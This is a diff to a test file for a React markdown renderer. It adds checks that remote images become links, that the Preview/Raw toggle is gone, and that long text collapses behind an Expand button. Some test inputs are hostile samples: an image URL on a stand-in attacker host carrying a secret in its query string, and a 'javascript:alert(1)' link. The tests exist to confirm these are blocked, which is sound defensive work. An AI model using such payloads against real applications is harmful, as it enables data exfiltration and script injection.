@@ -1,7 +1,7 @@
 import { createElement } from "react";
 import { renderToStaticMarkup } from "react-dom/server";
 import { describe, expect, it } from "vitest";
-import { MarkdownBody, MarkdownText } from "../src/components/markdown-text";
+import { isLongText, LONG_TEXT_CHARS, MarkdownBody, MarkdownText } from "../src/components/markdown-text";
 
 const render = (text: string) => renderToStaticMarkup(createElement(MarkdownBody, { text }));
 
@@ -21,6 +21,12 @@ describe("Markdown text (issue #85)", () => {
     expect(html).not.toContain("<img");
   });
 
+  it("never loads remote images, it shows a link instead", () => {
+    const html = render("![pic](https://evil.example/x.png?d=secret)");
+    expect(html).not.toContain("<img");
+    expect(html).toContain("<a ");
+  });
+
   it("drops javascript: links and opens real links in a new tab", () => {
     const bad = render("[x](javascript:alert(1))");
     expect(bad).not.toContain("javascript:");
@@ -30,9 +36,27 @@ describe("Markdown text (issue #85)", () => {
     expect(ok).toContain("noopener");
   });
 
-  it("shows the preview by default, with a switch to the raw text", () => {
+  it("has no Preview/Raw toggle and always renders the text", () => {
     const html = renderToStaticMarkup(createElement(MarkdownText, { text: "# Hi" }));
     expect(html).toContain("<h1>Hi</h1>");
-    expect(html).toContain("Raw");
+    expect(html).not.toContain("Raw");
+    expect(html).not.toContain("Preview");
+  });
+
+  it("shows long text collapsed with an Expand button (issue #88)", () => {
+    const long = Array.from({ length: 30 }, (_, n) => `- step ${n}`).join("\n");
+    expect(isLongText(long)).toBe(true);
+    expect(isLongText("x".repeat(LONG_TEXT_CHARS + 1))).toBe(true);
+    const html = renderToStaticMarkup(createElement(MarkdownText, { text: long }));
+    expect(html).toContain("Expand");
+    expect(html).toContain("collapsed");
+  });
+
+  it("shows short text with no Expand button (issue #88)", () => {
+    const short = "# Hi\n\nshort plan";
+    expect(isLongText(short)).toBe(false);
+    const html = renderToStaticMarkup(createElement(MarkdownText, { text: short }));
+    expect(html).not.toContain("Expand");
+    expect(html).not.toContain("collapsed");
   });
 });
